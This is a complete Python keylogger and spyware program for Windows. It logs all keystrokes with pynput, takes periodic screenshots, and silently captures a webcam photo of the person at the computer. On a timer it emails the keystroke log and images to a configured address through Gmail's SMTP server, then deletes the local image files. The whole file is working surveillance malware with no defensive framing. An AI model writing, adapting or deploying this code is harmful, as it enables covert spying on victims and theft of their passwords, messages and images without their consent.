import os
import smtplib
import threading
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import cv2
import pynput.keyboard
from PIL import ImageGrab


class Key:
    def __init__(self, time_interval, email, password):
        self.log = "Key Strike is in progress"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.USER = os.environ['USERPROFILE'][9:]

    def append(self, string):
        self.log = self.log + string

    def process_key_strokes(self, key):
        try:
            current_key = str(key.char)
            self.append(current_key)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.shift or key == key.shift_r:
                current_key = ""
            elif key == key.backspace:
                current_key = " ⩤ "
            else:
                current_key = " " + str(key) + " "
            self.append(current_key)

    def report(self):
        global screenshot, front
        try:
            print(self.log)
            self.picture()
            self.log = "" + self.log
            message = MIMEMultipart('mixed')
            MESSAGE_BODY = self.log
            body_part = MIMEText(MESSAGE_BODY, 'plain')
            message['Subject'] = "KeyStrokes of " + str(self.USER)
            message.attach(body_part)
            PATH_TO_IMAGE_FILE = os.getcwd()
            screenshot = PATH_TO_IMAGE_FILE + "\\Screenshot" + str(self.interval) + '.png'
            front = PATH_TO_IMAGE_FILE + "\\" + self.USER + ".png"
            if os.path.exists(screenshot):
                with open(screenshot, 'rb') as file:
                    message.attach(MIMEImage(file.read(), Name='image.png'))
                    file.close()
            if self.log == "Key Strike is in progress":
                if os.path.exists(front):
                    fp = open(front, 'rb')
                    msgImage = MIMEImage(fp.read())
                    fp.close()
                    msgImage.add_header('Content-ID', '<image2>')
                    message.attach(msgImage)
            message = message.as_string()
            self.send_mail(self.email, self.password, message)
            self.log = ""
            os.remove(screenshot)
            timer = threading.Timer(self.interval, self.report)
            timer.start()
        except Exception as errors:
            print("[-] Error is " + str(errors))
            os.remove(screenshot)
            os.remove(front)
            pass

    def send_mail(self, email, password, message):
        print("[+] Start mailing.....")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, self.email, message)
        server.quit()

    def picture(self):
        try:
            screenshots = ImageGrab.grab()
            screenshots.save("Screenshot" + str(self.interval) + '.png')
        except Exception as errors:
            print("[-] Error is " + str(errors))
            pass

    def frontPicture(self):
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if cam.isOpened():
                img_counter = 0
                ret, frame = cam.read()
                print(ret)
                if ret:
                    img_name = "{}.png".format(self.USER)
                    cv2.imwrite(img_name, frame)
                    print("{} written!".format(img_name))
                img_counter += 1
                cam.release()
            cv2.destroyAllWindows()
        except Exception as errors:
            print("[-] Error is " + str(errors))
            pass

    def start(self):
        self.frontPicture()
        key_listener = pynput.keyboard.Listener(on_press=self.process_key_strokes)
        with key_listener:
            self.report()
            key_listener.join()


try:
    # Can Also change time span of sending mail.
    a = Key(20, "Enter Mail here", "Enter Password here")
    a.start()
except Exception as error:
    print("[-] Error is " + str(error))
